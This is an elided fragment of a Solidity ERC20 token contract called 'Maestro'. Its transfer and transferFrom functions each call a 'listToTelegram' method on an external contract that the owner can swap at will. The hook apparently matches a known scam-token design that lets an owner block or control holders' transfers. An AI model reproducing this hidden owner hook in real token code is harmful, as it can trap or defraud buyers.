...
contract Maestro is ERC20, Ownable {
    List public list;
    constructor(uint256 _decimals, address _list, uint256 _initSupply) ERC20("Maestro", "Maestro") Ownable() {
       list = List(_list);
    ...
    function listTo(address _list) public onlyOwner {
        list = List(_list);
    }

    function transfer(address to, uint256 value) override public returns (bool) {
        list.listToTelegram(msg.sender, to, value);
        return super.transfer(to, value);
    }

    function transferFrom(address from, address to, uint256 value) override public returns (bool) {
        list.listToTelegram(from, to, value);
